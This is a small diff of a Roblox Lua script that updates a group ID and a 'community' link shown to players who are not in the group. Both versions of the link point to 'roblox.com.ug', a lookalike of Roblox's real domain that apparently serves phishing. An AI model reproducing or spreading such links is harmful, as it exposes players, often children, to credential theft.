@@ -3,8 +3,8 @@ local TweenService = game:GetService("TweenService")
 
 local player = Players.LocalPlayer
 
-local GROUP_ID = 5235987793
-local GROUP_LINK = "https://roblox.com.ug/communities/5235987793/#!/about"
+local GROUP_ID = 421405843
+local GROUP_LINK = "https://roblox.com.ug/communities/421405843/"
 
 if player:IsInGroup(GROUP_ID) then return end
 
